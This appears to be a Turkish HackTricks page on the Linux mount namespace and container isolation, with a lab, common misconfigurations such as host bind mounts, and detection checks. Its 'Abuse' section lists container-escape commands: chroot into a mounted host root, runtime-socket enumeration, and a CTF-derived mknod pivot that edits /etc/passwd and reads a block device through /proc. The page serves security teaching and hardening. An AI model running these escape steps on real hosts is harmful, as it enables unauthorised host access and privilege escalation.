# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Mount namespace, bir process'in gördüğü **mount table**'ı kontrol eder. Bu, en önemli container isolation özelliklerinden biridir; çünkü root filesystem, bind mount'lar, tmpfs mount'ları, procfs görünümü, sysfs erişimi ve runtime'a özgü birçok yardımcı mount'ın tamamı bu mount table üzerinden ifade edilir. İki process `/`, `/proc`, `/sys` veya `/tmp` yollarına erişebilse de bu yolların neye çözümlendiği, içinde bulundukları mount namespace'e bağlıdır.

Container-security açısından mount namespace çoğu zaman "düzenli şekilde hazırlanmış bir application filesystem" ile "bu process host filesystem'ını doğrudan görebilir veya etkileyebilir" arasındaki farktır. Bu nedenle bind mount'lar, `hostPath` volume'ları, privileged mount işlemleri ve writable `/proc` veya `/sys` erişimleri bu namespace etrafında şekillenir.

## Çalışma

Bir runtime container başlattığında genellikle yeni bir mount namespace oluşturur, container için bir root filesystem hazırlar, gerektiğinde procfs ve diğer yardımcı filesystem'ları mount eder ve ardından isteğe bağlı olarak bind mount'lar, tmpfs mount'ları, secret'lar, config map'ler veya host path'ler ekler. Bu process namespace içinde çalışmaya başladıktan sonra gördüğü mount kümesi büyük ölçüde host'un varsayılan görünümünden bağımsız hale gelir. Host hâlâ altta bulunan gerçek filesystem'ı görebilir; ancak container, runtime tarafından kendisi için oluşturulan sürümü görür.

Bu özellik güçlüdür; çünkü host her şeyi yönetmeye devam etmesine rağmen container'ın kendi root filesystem'ına sahip olduğuna inanmasını sağlar. Ancak aynı zamanda tehlikelidir; çünkü runtime yanlış mount'ı expose ederse process, security model'in geri kalanının korumak üzere tasarlanmamış olabileceği host kaynaklarını aniden görebilir.

## Lab

Şu komutla private bir mount namespace oluşturabilirsiniz:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Bu namespace'in dışındaki başka bir shell'i açıp mount table'ı incelerseniz, tmpfs mount'ının yalnızca izole edilmiş mount namespace içinde var olduğunu görürsünüz. Bu, mount isolation'ın soyut bir teori olmadığını göstermesi açısından yararlı bir egzersizdir; kernel, process'e kelimenin tam anlamıyla farklı bir mount table sunar.

Bu namespace'in dışındaki başka bir shell'i açıp mount table'ı incelerseniz, tmpfs mount'ı yalnızca izole edilmiş mount namespace içinde var olacaktır.

Container'lar içinde hızlı bir karşılaştırma şöyledir:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
İkinci örnek, bir runtime configuration'ın filesystem sınırında nasıl kolayca devasa bir açık oluşturabileceğini gösterir.

## Runtime Kullanımı

Docker, Podman, containerd tabanlı stack'ler ve CRI-O, normal container'lar için private bir mount namespace'e dayanır. Kubernetes, volume'lar, projected secret'lar, config map'ler ve `hostPath` mount'ları için aynı mekanizma üzerine kurulur. Incus/LXC ortamları da mount namespace'lere büyük ölçüde dayanır; özellikle system container'lar, application container'lara kıyasla genellikle daha zengin ve makineye daha çok benzeyen filesystem'lar sunduğu için.

Bu, bir container filesystem problemini incelerken genellikle izole bir Docker tuhaflığıyla karşı karşıya olmadığınız anlamına gelir. Platform workload'u nasıl başlattıysa, o platform üzerinden ifade edilen bir mount namespace ve runtime configuration problemiyle karşı karşıyasınızdır.

## Yanlış Yapılandırmalar

En bariz ve tehlikeli hata, host root filesystem'ını veya başka bir hassas host path'ini bir bind mount aracılığıyla dışa açmaktır; örneğin `-v /:/host` veya Kubernetes'te yazılabilir bir `hostPath`. Bu noktada soru artık "container bir şekilde escape edebilir mi?" değil, "hangi yararlı host içeriği zaten doğrudan görülebilir ve yazılabilir?" olur. Yazılabilir bir host bind mount, exploit'in geri kalanını çoğu zaman basit bir file placement, chroot işlemi, config modification veya runtime socket discovery meselesine dönüştürür.

Bir diğer yaygın sorun, host `/proc` veya `/sys` dosystems'larının daha güvenli container görünümünü bypass edecek şekilde dışa açılmasıdır. Bu filesystem'lar sıradan data mount'ları değildir; kernel ve process state'e açılan arayüzlerdir. Workload doğrudan host sürümlerine erişebiliyorsa, container hardening'in arkasındaki varsayımların çoğu artık düzgün şekilde uygulanamaz.

Read-only protections da önemlidir. Read-only bir root filesystem container'ı sihirli biçimde güvenli hâle getirmez, ancak attacker staging alanının büyük bir bölümünü ortadan kaldırır ve persistence, helper-binary yerleştirme ve config tampering işlemlerini zorlaştırır. Buna karşılık, yazılabilir bir root veya yazılabilir bir host bind mount, attacker's bir sonraki adımı hazırlayabileceği alan sağlar.

## Abuse

Mount namespace yanlış kullanıldığında attackers genellikle dört şeyden birini yapar. Container dışında kalması gereken **host data'yı okurlar**. Yazılabilir bind mount'lar üzerinden **host configuration'ını değiştirirler**. Capabilities ve seccomp izin veriyorsa **ek resources mount veya remount ederler**. Ya da daha fazla erişim elde etmek üzere container platformuna istek göndermelerini sağlayan **güçlü socket'lere ve runtime state directory'lerine ulaşırlar**.

Container host filesystem'ını zaten görebiliyorsa, security model'in geri kalanı anında değişir.

Bir host bind mount'tan şüpheleniyorsanız, önce nelerin mevcut olduğunu ve yazılabilir olup olmadığını doğrulayın:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Host root filesystem read-write olarak mount edilmişse, doğrudan host erişimi genellikle şu kadar basittir:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Amaç doğrudan chrooting yerine ayrıcalıklı runtime erişimiyse, socket'leri ve runtime durumunu enumerate edin:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
`CAP_SYS_ADMIN` mevcutsa, container içinden yeni mount'lar oluşturulup oluşturulamadığını da test edin:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Tam Örnek: İki Shell ile `mknod` Pivot

Daha özel bir abuse path, container root user'ının block device oluşturabildiği, host ve container'ın yararlı bir şekilde aynı user identity'yi paylaştığı ve attacker'ın host üzerinde zaten low-privilege bir foothold elde ettiği durumlarda ortaya çıkar. Bu durumda container, `/dev/sda` gibi bir device node oluşturabilir ve low-privilege host user'ı daha sonra bunu eşleşen container process'i için `/proc/<pid>/root/` üzerinden okuyabilir.<sup>[[1]](#references)</sup>

Container'ın içinde:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Host üzerinden, container shell PID'sini bulduktan sonra eşleşen düşük ayrıcalıklı kullanıcı olarak:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Önemli ders, tam olarak CTF string araması değildir. Ders, `/proc/<pid>/root/` üzerinden mount namespace exposure'ın, cgroup device policy container içinde doğrudan kullanımı engellemiş olsa bile, host user'ın container tarafından oluşturulmuş device node'ları yeniden kullanmasına olanak sağlayabilmesidir.<sup>[[1]](#references)</sup>

## Kontroller

Bu komutlar, mevcut process'in gerçekte içinde çalıştığı filesystem görünümünü göstermek içindir. Amaç; host kaynaklı mount'ları, yazılabilir hassas path'leri ve normal bir application container root filesystem'inden daha geniş görünen her şeyi tespit etmektir.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Burada ilgi çekici olanlar:

- Host üzerinden alınan bind mount'lar, özellikle `/`, `/proc`, `/sys`, runtime state dizinleri veya socket konumları hemen dikkat çekmelidir.
- Beklenmeyen read-write mount'lar, genellikle çok sayıda read-only yardımcı mount'tan daha önemlidir.
- `mountinfo`, bir path'in gerçekten host kaynaklı mı yoksa overlay-backed mi olduğunu görmek için çoğu zaman en iyi yerdir.

Bu kontroller, **bu namespace içinde hangi kaynakların görünür olduğunu**, **hangilerinin host kaynaklı olduğunu** ve **hangilerinin writable veya security-sensitive olduğunu** belirler.

## References

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
